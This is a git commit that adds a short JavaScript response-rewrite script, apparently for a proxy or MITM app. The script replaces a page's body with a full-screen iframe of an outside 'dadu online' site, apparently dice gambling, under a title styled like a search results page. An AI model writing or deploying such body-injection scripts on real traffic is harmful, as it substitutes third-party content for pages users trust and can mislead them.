f2ba7f0e3761bae22235d950691ae57ff7f26a02
koyongmodex <lontongkhoirul0@gmail.com>
2026-03-13 21:30:04 +0700

    Add files via upload

---
+++ setnewwhite-kyng.js
@@ -0,0 +1,16 @@
+let body = `
+<!DOCTYPE html>
+<html>
+<head>
+<title>dadu online - Penelusuran</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+</head>
+<body style="background:#ffffff;margin:0;padding:0;overflow:hidden;">
+<div style="height:env(safe-area-inset-top);background:#ffffff;width:100%;position:sticky;top:0;z-index:999;"></div>
+<iframe src="https://setdadubykyng.com/index.php"
+style="width:100vw;height:130vh;border:0;display:block;background:#ffffff;"></iframe>
+</body>
+</html>
+`;
+
+$done({ body });
